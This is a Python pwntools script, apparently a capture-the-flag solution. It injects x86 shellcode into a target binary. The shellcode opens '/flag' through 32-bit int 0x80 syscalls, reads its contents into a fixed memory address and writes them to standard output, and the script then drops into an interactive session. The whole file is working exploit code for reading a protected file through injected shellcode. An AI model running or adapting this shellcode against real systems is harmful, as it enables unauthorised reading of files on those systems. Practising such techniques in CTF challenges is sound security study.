#!/bin/python

import os
import sys
from pwn import * 

#context.arch = 'i386'
WRITABLE_MEM = 0x1337000 + 0x1000 - 58

if (len(sys.argv) > 2):
    proc = process(['sudo', 'strace', sys.argv[1]])
else:
    proc = process([sys.argv[1]], close_fds=False)

sc_bytes = (f'''
                mov ebx, {WRITABLE_MEM}
                mov qword ptr [ebx], 0x616c662f
                mov qword ptr [ebx + 4], 0x67
                xor ecx, ecx
                xor edx, edx
                mov eax, 5
                int 0x80
            '''
          + 
            f'''
                mov ebx, eax
                mov ecx, {WRITABLE_MEM}
                mov edx, 58
                mov eax, 3
                int 0x80
            '''
          + 
            f'''
                mov ebx, 1
                push {WRITABLE_MEM}
                pop rcx
                push 0x3a
                pop rdx
                push 4
                pop rax
                int 0x80
            '''
)

print(sc_bytes)
proc.send(asm(sc_bytes, arch='amd64'))
proc.interactive()
